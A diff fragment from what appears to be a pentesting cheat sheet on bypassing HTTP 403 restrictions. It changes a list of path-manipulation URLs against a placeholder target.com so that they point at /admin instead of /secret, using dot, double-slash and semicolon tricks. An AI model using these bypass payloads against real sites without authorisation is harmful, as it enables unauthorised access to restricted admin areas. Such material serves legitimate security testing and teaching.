@@ -25,12 +25,12 @@ http://target.com/%2e/admin
 http://target.com/admin
 
 # Try this to bypass (200)
-http://target.com/secret/.
-http://target.com//secret//
-http://target.com/./secret/..
-http://target.com/;/secret
-http://target.com/.;/secret
-http://target.com//;//secret
+http://target.com/admin/.
+http://target.com//admin//
+http://target.com/./admin/..
+http://target.com/;/admin
+http://target.com/.;/admin
+http://target.com//;//admin
 ```
 ### Add `..;/` after the directory name
 ```bash
